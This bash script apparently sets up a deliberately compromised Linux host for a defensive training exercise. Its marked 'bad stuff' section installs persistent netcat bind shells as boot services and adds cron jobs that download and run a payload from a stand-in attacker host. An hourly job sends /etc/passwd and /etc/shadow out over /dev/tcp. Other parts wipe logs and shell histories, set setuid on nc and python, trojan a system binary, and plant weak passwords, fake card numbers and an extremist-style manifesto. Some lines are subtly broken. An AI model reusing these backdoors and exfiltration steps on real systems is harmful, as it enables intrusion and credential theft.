#!/bin/bash
echo 127.0.0.1 $(hostname) >> /etc/hosts
useradd -m -U -G sudo -s /bin/bash administrator
echo "administrator:DoDC0mp1!an7P@ssw0rd" | chpasswd
apt-get -y update
pkg_array=({install,locate,dnsutils,lsof,aptitude,ftp,auditd,telnet,git,zip,unzip,figlet,hexedit,tree,apache2,gcc,tcc,build-essential,libreadline-dev,libssl-dev,libpq5,libpq-dev,libreadline5,libsqlite3-dev,libpcap-dev,git-core,autoconf,pgadmin3,curl,zlib1g-dev,libxml2-dev,libxslt1-dev,libyaml-dev,python-setuptools,python-dev,build-essential,john,xrdp,netcat,firefox})
for x in ${pkg_array[@]}; do apt-get install -y $x; done
apt-get -y upgrade 

#test user
cat >> /tmp/noshell.c <<"__EOF__"
#include <stdio.h>

int main(int argc, char *argv[]) {
    int c;
    printf("Custom Shell NO v1.0\n");
    printf("Type something -->");
    while (1) {
        c = getchar();
        if (c == '\n') {
            printf("NO!\nType something --> ");
        }
    }
}
__EOF__
gcc -o /usr/noshell /tmp/noshell.c
rm /tmp/noshell.c
useradd -m -U -s /usr/noshell test
echo "test:password" | chpasswd



# ----- BAD STUFF -----

#Add users
useradd alice -m -U -s /bin/bash -c "The one and only" -p "password123456"
useradd bob -m -U -s /bin/bash -c "Employee of the month" -G alice -p "bobbybo"
useradd charlie -m -U -s /bin/bash -c "Very annoying employee" -p "passwordqwerty"
useradd dan -m -U -s /bin/bash -c "Super awesome employee" -p "password"
useradd eve -m -M -N -s /bin/bash -c "Most chill person ever" -p "comrade"
useradd frank -m -U -s /bin/bash -c "Loves hotdogs" -p "password11"
useradd grant -m -U -s /bin/bash -c "Ulysses S" -p "passwordPaSsWoRd"
useradd howard -m -U -s /bin/rbash -c "Dude with the cowboy hat" -G eve -p "eve"
useradd ian -m -U -s /bin/bash -c "Definitely a spook" -G sudo,alice -p "password"
useradd milton -m -U -s /bin/bash -c "gardian of the company septor" -G sudo -p "swingline"
useradd janice -m -U -s /bin/bash -c "From accounting" -G milton -p "goodpassword"
useradd morpheus -m -U -s /bin/bash -c "Looking for the ONE" -G dan -p "neo"
useradd smegel -m -U -s /bin/bash -c "the precious" -G sudo,shadow -p "ring"
useradd peter -m -U -s /bin/bash -c "moonlights as human spider" -p "MJ"
useradd lisa -m -U -s /bin/rbash -c "new to the organization" -p "passwordqazxsw"
useradd tommy -m -U -s /bin/rbash -c "the tank" -p "PassworD"
useradd bert -m -U -s /usr/sbin/nologin -c "secretely plotting to end ernie" -p "ernie"
useradd ernie -m -U -s /bin/bash -c "Lives to annoy bert" -G bert -p "bert"
useradd thor -m -U -s /bin/bash -c "Has a real God complex" -G lisa -p "myhammeristhebest"
useradd charlene -m -U -s /bin/bash -c "every office has one" -p "passwordpasswordpassword"

echo "alice:password123456" | chpasswd
echo "bob:bobbybo" | chpasswd
echo "charlie:passwordqwerty" | chpasswd
echo "dan:password" | chpasswd
echo "eve:comrade" | chpasswd
echo "frank:password!1!1!" | chpasswd
echo "grant:passwordPaSsWoRd" | chpasswd
echo "howard:eve" | chpasswd
echo "ian:password" | chpasswd -c SHA256
echo "janice:goodpassword" | chpasswd
echo "morpheus:neo" | chpasswd
echo "smegel:ring" | chpasswd
echo "peter:MJ" | chpasswd
echo "lisa:passwordqazxsw" | chpasswd
echo "tommy:PassworD" | chpasswd
echo "ernie:bert" | chpasswd
echo "bert:ernie" | chpasswd
echo "thor:myhammeristhebest" | chpasswd
echo "charlene:passwordpasswordpassword" | chpasswd -c SHA256
echo "milton:swingline" | chpasswd
passwd -d howard
passwd -d lisa
passwd -l grant

echo "eve's password: comrade" > /boot/grub/grub.cPg
chown howard:howard /boot/grub/grub.cPg
chmod 0070 /boot/grub/grub.cPg

#Setuid on specific binaries
chmod u+s /usr/bin/nmap
chmod u+s /bin/{nc,netcat}
chmod u+s /usr/bin/python2.7

# Identify bad binary
md5sum $(find /usr/local/{bin,sbin} /usr/{bin,sbin} /{bin,sbin}) > /root/KnownGoodBinaries.txt
cat /root/KnownGoodBinaries.txt | awk '{ print $1 }' | sort | uniq > /root/KnownGoodBinaries1.txt
mv /root/KnownGoodBinaries1.txt /root/KnownGoodBinaries.txt

cat >> /tmp/yes.c << "__EOF__"
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        while (1) {
            printf("Access: y\n");
        }
    }
    while(1) {
        printf("%s\n", argv[1]);
    }
}
__EOF__
gcc -o /tmp/yes /tmp/yes.c
rm /usr/bin/yes
mv /tmp/yes /usr/bin/yes
rm /tmp/yes.c

#critical research project
cat >> /home/bob/research.sh <<"__EOF__"
#!/bin/bash
echo "This is research" > research
while :
do
	md5sum research > research1
	mv research1 research
	sleep 60
done
__EOF__
chmod +x /home/bob/research.sh
cat >> /etc/init.d/research <<"__EOF__"
#!/bin/bash

### BEGIN INIT INFO
# Provides:			research
# Required-Start:
# Required-Stop:
# Default-Start:	2 3 4 5
# Default-Stop:		0 1 6
# Short-Description:
wget# Description
### END INIT INFO

case "$1" in
	start)
		cd /home/bob
		(/home/bob/research.sh) &
		;;
	*)
		;;
esac
exit 0
__EOF__
chmod +x /etc/init.d/research
update-rc.d research defaults



cat >> /var/www/html/index.html <<"__EOF__"
<html>
This is a critical file that employees must have access to at all times.<br>
If this web server goes down, the business fails.<br>
</html>
__EOF__
service apache2 start

#bob backdoor
echo 'bob:badpassword' | chpasswd
cat >> /home/bob/listener.sh <<"__EOF__"
#!/bin/bash
mknod /home/bob/fifo p
while :
    do
    nc -nlp 12345 < /home/bob/fifo | /bin/bash > /home/bob/fifo
done
__EOF__
chmod +x /home/bob/listener.sh
cat >> /etc/init.d/listener <<"__EOF__"
#!/bin/bash

### BEGIN INIT INFO
# Provides:          listener
# Required-Start:    
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: 
# Description:       
### END INIT INFO

case "$1" in
    start)
        (/home/bob/listener.sh) &
        ;;
    *)
        ;;
esac
exit 0
__EOF__
chmod +x /etc/init.d/listener
update-rc.d listener defaults

#bob backdoor
cat >> /var/lib/python/python <<"__EOF__"
#!/bin/bash
mknod /tmp/tempfile p
while :
    do
    nc -nlp 54321 < /tmp/tempfile | /bin/bash > /tmp/tempfile
done
__EOF__
chmod u+x /var/lib/python/python
cat >> /etc/init.d/python <<"__EOF__"
#!/bin/bash

### BEGIN INIT INFO
# Provides:          python
# Required-Start:    
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: 
# Description:       
### END INIT INFO

case "$1" in
    start)
        (/var/lib/python/python) &
        ;;
    *)
        ;;
esac
exit 0
__EOF__
chmod +x /etc/init.d/python
update-rc.d python defaults

#replicating malware
cat >> /etc/init.d/inti <<"__EOF__"
#!/bin/bash

### BEGIN INIT INFO
# Provides:          inti
# Required-Start:    
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: 
# Description:       
### END INIT INFO

case "$1" in
    start)
        echo '#!/bin/bash' > /usr/share/inti
        echo 'while :' >> /usr/share/inti
        echo 'do' >> /usr/share/inti
        echo 'sleep 300' >> /usr/share/inti
        echo '(/usr/share/inti) &' >> /usr/share/inti
        echo 'done' >> /usr/share/inti
        chmod +x /usr/share/inti
        (/usr/share/inti) &
        ;;
    *)
        ;;
esac
exit 0
__EOF__
chmod +x /etc/init.d/inti
update-rc.d inti defaults

#janice PII present in document 
useradd janice -m -U -s /bin/bash
echo 'janice:goodpassword' | chpasswd
cat >> /home/janice/data.txt <<"__EOF__"
Name: Bobby Bright
SSN: 123-45-6789
Phone: 123-456-7890
Address: 123 Cyber School St. Ft. Gordon, GA 30905
Mothers Maiden Name: Palooza
Credit Card: 1234-5678-9012-3456
CVV: 123
__EOF__

#games passwords file
cat >> /usr/games/thunder.txt <<"__EOF__"
Thunder Game Server Passwords!
user: bob - password: bobbybo
user: janice - password: goodpassword
user: Thor - password:myhammeristhebest
__EOF__

#password in sshd file
echo '#Bob, the SSH server password is "NeverGiveUpNeverSurrender", Sincerely, Alice.'>> /etc/ssh/sshd_config

#phone number in /etc/python/debian_config
echo '#Bob, we pay for our Software licenses with card: 5429-1735-9823-1457 CVV 132 -Alice' >> /etc/python/debian_config

#personal informaiton
cat >> /var/backups/contactme.txt <<"__EOF__"
For backup assistance, call your administrator at 706-791-1234
Our business backups are provided by Anderson Backups, LLC.
"Our service will back you up"
We are paying for our backup account with the following credit card:
4921-3831-1749-1017
__EOF__

#old payment informaiton
cat >> /home/charlie/payment.txt <<"__EOF__"
Alice: 4753-1728-0910-4639
Bob: 4086-2671-9514-2306
Charlie: 5295-6808-3470-4043
(Big Gun) The General: 6011-2428-8792-3672
__EOF__


#/etc/rc.local forkbomb
sed -i 's:#!/bin/sh -e:#!/bin/sh:' /etc/rc.local
sed -i '$ d' /etc/rc.local
cat >> /etc/rc.local <<"__EOF__"
((while :; do sleep 666; wall -n "$(echo 'fOrKyOu?' | figlet)"; done) &)
exit 0
__EOF__



#/etc/bash.bashrc Pwnd!
head -n 5 /etc/bash.bashrc > /tmp/bash.bashrc
cat >> /tmp/bash.bashrc <<"__EOF__"
if [[ $EUID -eq 0 ]]; then
    ((sleep 3; wall -n "$(echo 'Got root ?' | figlet)"; wall -n "$(echo "SO DO I!  Thanks! " | figlet)") &)
fi
__EOF__

#Russian Anthem .. signed with love from "eve"
echo 'if [[ $EUID -eq $(id -u howard) ]]; then cat /etc/.contact; fi' >> /etc/bash.bashrc
cat >> /etc/.contact <<"__EOF__"

Россия — священная наша держава,
Россия — любимая наша страна.
Могучая воля, великая слава —
Твоё достоянье на все времена!

Славься, Отечество наше свободное,
Братских народов союз вековой,
Предками данная мудрость народная!
Славься, страна! Мы гордимся тобой!

От южных морей до полярного края
Раскинулись наши леса и поля.
Одна ты на свете! Одна ты такая —
Хранимая Богом родная земля!

Широкий простор для мечты и для жизни
Грядущие нам открывают года.
Нам силу даёт наша верность Отчизне.
Так было, так есть и так будет всегда!

wитh греатест лове,
еве

__EOF__


#  [Russian]                             MANIFESTO!

#1. collect on members of org. leadership, and report to higher.
#2. use gathered intel to discredit, and create division amongst org. leadership.
#3. orchestrate intelligence leak; pin it on frank.
#4. dismantle entire org. from inside out, using fraudulent claims leaked to the media.
#5. assume control of org. reorganize it to suit of the Fuhrer.

#Heil Fuhrer!
echo 'if [[ $EUID -eq $(id -u eve) ]]; then cat /usr/share/misc/.manifesto; fi' >> /etc/bash.bashrc
cat >> /usr/share/misc/.manifesto <<"__EOF__"

МАНИФЕСТО!

1. cоллеcт он мемберс оф орг. леадершип, анд репорт то hигhер.
2. усе гатhеред интел то дисcредит, анд cреате дивисион амонгст орг. леадершип.
3. орчестрате интеллигенcе леак; пин ит он франк.
4. дисмантле ентире орг. фром инсиде оут, усинг фраудулент cлаимс леакед то тhе медиа.
5. ассуме cонтрол оф орг. реорганизе ит то суит оф тhе Фуhрер.

Hеил Фуhрер!

__EOF__


tail -n +5 /etc/bash.bashrc >> /tmp/bash.bashrc
mv /tmp/bash.bashrc /etc/bash.bashrc

#annoying sudo function  #REPLACE with Rick Atley Song
cat >> /usr/share/.bird << "__EOF__"
A-well-a ev'rybody's heard about the bird

B-b-b-bird, b-birdd's a word

A-well, a bird, bird, bird, bird is a word

A-well, a bird, bird, bird, well-a bird is a word

A-well, a bird, bird, bird, b-bird's a word

A-well, a bird, bird, bird, well-a bird is a word

A-well, a bird, bird, b-bird is a word

A-well, a bird, bird, bird, b-bird's a word

A-well, a bird, bird, bird, well-a bird is a word

A-well, a bird, bird, b-bird's a word

A-well-a don't you know about the bird?

Well, everybody knows that the bird is a word

A-well-a-bird, bird, b-bird's a word, a-well-a

A-well-a everybody's heard about the bird

Bird, bird, bird, b-bird's a word

A-well, a bird, bird, bird, b-bird's a word

A-well, a bird, bird, bird, b-bird's a word

__EOF__
chmod +x /usr/share/.bird

#annoying sudo function
cp /etc/bash.bashrc /var/run/.bash.bak 
cat >> /usr/share/.haha << "__EOF__"
function sudo() {
read -p "[sudo] password for $(whoami):" ENTRY
		if [[ $ENTRY != YES ]]; then
			sleep 1; clear
			echo "Sorry, try again."
			sleep 2; clear
			read -p "[sudo] password for $(whoami):" ENTRY2
				if [[ $ENTRY2 != YES ]]; then
					sleep 2; clear
					read -p "Arn't you getting tired of this yet?" ENTRY3
					sleep 2; clear
						if [[ $ENTRY3 != NO ]]; then
							sleep 1; clear
							echo "Sorry, try again."
							sleep 2; clear
							read -p "[sudo] password for $(whoami):" ENTRY4
								if [[ $ENTRY3 != NO ]]; then
									sleep 1; clear
									echo "Persistent arn't you?"
									sleep 2; clear
									read -p "Why did the chicken cross the road?" ANSWER
										if [[ $ANSWER != idunno ]]; then
											sleep 1; clear
											echo "Steak is better then chicken IMO . ."
											sleep 3; clear
											read -p "So!  what brings YOU here?" ANSWER2
												if [[ $ANSWER3 != idunno ]]; then
													sleep 1; clear
													echo "I wasn't talking to YOU !!!"
													sleep 3; clear
													read -p "Have you heard about the bird (yes/no/huh)" ANSWER4
														if [[ $ANSWER4 == huh ]]; then 
															sleep 2; echo "OKAY .. you win .. sudo is restored"      "
															sleep 1; clear; sleep 2; echo "N O T !!!"
															sleep 1
																for x in {1..100}; do IFS=$'\n';
																	for y in $(less /usr/share/.bird); do
																		echo $y; sleep 1;
																	done
																done
														elif [[ $ANSWER4 != huh ]]; then 
															echo 
															echo "Check it out!"
															echo
															for x in {1..100}; do IFS=$'\n';
																for y in $(less /usr/share/.bird); do
																	echo $y; sleep 1;
																done
															done
														fi
												fi
										fi
								fi
						fi
				fi
		fi

}
__EOF__

sed '/shopt -s checkwinsize/r /usr/share/.haha' -i /etc/bash.bashrc


#annoying cat function
cat >> /var/run/.me <<"__EOF__"
function cat() {
echo "cat: $1: No such file or directory"
}
__EOF__
for x in $(find /home -type f -name ".bashrc" -exec echo {} \;); do
	sed '/subdirectories./r /var/run/.me' -i $x; done


#shutdown
sed -i 's:~/.bashrc:/.bashrc:' /root/.profile
cp /root/.bashrc /.bashrc
echo '(/usr/share/screen/shutdown &)' >> /.bashrc
cat >> /usr/share/screen/shutdown <<"__EOF__"
#!/bin/bash
sleep 60
shutdown -h +3  
echo " Shutdown Initiated !" | figlet
sleep 2
clear
for i in {10..3}; do
  echo "Shutdown in: $i"
  sleep 2
  clear
done
echo "$(echo 'Good  Bye' | figlet)"
sleep 2; clear;
echo "$(echo 'Just  Kidding' | figlet)"
sleep 2; clear;
echo "$(echo 'but Seriously . .' | figlet)"
sleep 2; clear;
for x in {1..10}; do
	clear;
	echo
	echo "    Bu - Bye"
	echo
	echo "   ¯\_(ツ)_/¯"
	echo;
	sleep 3;
done
__EOF__
chmod +x /usr/share/screen/shutdown

#root bashrc annoyance
cat >> /root/.bashrc <<"__EOF__"
a=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 5)
a=$a$'\n'
echo "Holy Smokes! Where am I ?!" > /root/$a
__EOF__

#random shutdown warnings
#cat >> /root/.profile <<"__EOF__"
#(sleep 300; shutdown -k 5; while : ; do sleep 500; shutdown -k 5; done;) &
#__EOF__

#random webservers
cat >> /etc/init.d/webserver <<"__EOF__"
#!/bin/bash

### BEGIN INIT INFO
# Provides:          webserver
# Required-Start:    
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: 
# Description:       
### END INIT INFO

case "$1" in
    start)
        cd /etc
        (while :; do python -m SimpleHTTPServer 80; done) &
        cd /var
        (while :; do python -m SimpleHTTPServer 443; done) &
        ;;
    *)
        ;;
esac
exit 0
__EOF__
chmod +x /etc/init.d/webserver
update-rc.d webserver defaults

#cron jobs touch everything
crontab -l > /tmp/cronjob
echo '15 * * * * (for item in $(find /lib /tmp /var /bin /etc /home /lib64 /root /sbin /usr); do touch $item; done)' >> /tmp/cronjob
echo '45 * * * * (for item in $(find /lib /tmp /var /bin /etc /home /lib64 /root /sbin /usr); do touch $item; done)' >> /tmp/cronjob
crontab /tmp/cronjob

#cron jobs to delete logs
crontab -l > /tmp/cronjob
echo '20 * * * * (for item in $(ls /var/log); do echo "" > /var/log/$item; done)' >> /tmp/cronjob
echo '50 * * * * (for item in $(ls /var/log); do echo "" > /var/log/$item; done)' >> /tmp/cronjob
crontab /tmp/cronjob

#cron jobs delete bash histories
echo '1 * * * * root (find / -type f -name /root/.bash_history -exec echo "" > {} \;)' >> /etc/crontab
echo '31 * * * * root (find / -type f -name /home/{eve,howard}/.bash_history -exec echo "" > {} \;)' >> /etc/crontab

#cron jobs to launch malware
echo '11 * * * * root (wget Voice_of_Korea.cnc.kp/updates.sh -O /tmp/kthreadaemon; chmod +x /tmp/kthreadaemon; (/tmp/kthreadaemon) & )' >> /etc/crontab
echo '41 * * * * root (wget Voice_of_Korea.cnc.kp/updates.sh -O /tmp/kthreadaemon; chmod +x /tmp/kthreadaemon; (/tmp/kthreadaemon) & )' >> /etc/crontab

#cron job to exfiltrate data
cat >> /etc/cron.hourly/maintenance.sh <<"__EOF__"
#!/bin/bash
exec 3<>/dev/tcp/library.shijiazhuang.cn/61398
cat /etc/passwd /etc/shadow > 3
exec 3>&-
__EOF__
chmod +x /etc/cron.hourly/maintenance.sh

#odd entry in hosts file
echo '175.45.176.203 Voice_of_Korea.cnc.kp' >> /etc/cloud/templates/hosts.debian.tmpl
echo '42.245.208.56 library.shijiazhuang.cn' >> /etc/cloud/templates/hosts.debian.tmpl

#add a malicious alias
cat >> /etc/bash.bashrc <<"__EOF__"
if [[ $EUID -eq 0 ]]; then
    ((sleep 45; wall -n "I F   T H E S E   W A L L S   C O U L D   S P E A K  . . .") &)
fi
__EOF__

#wipe binary time stamps
for item in $(find /{bin,sbin} /usr/{bin,sbin} /usr/local/{bin,sbin}; do touch -t 202001010001.01 $item; done

# ----- BAD STUFF DONE -----

reboot
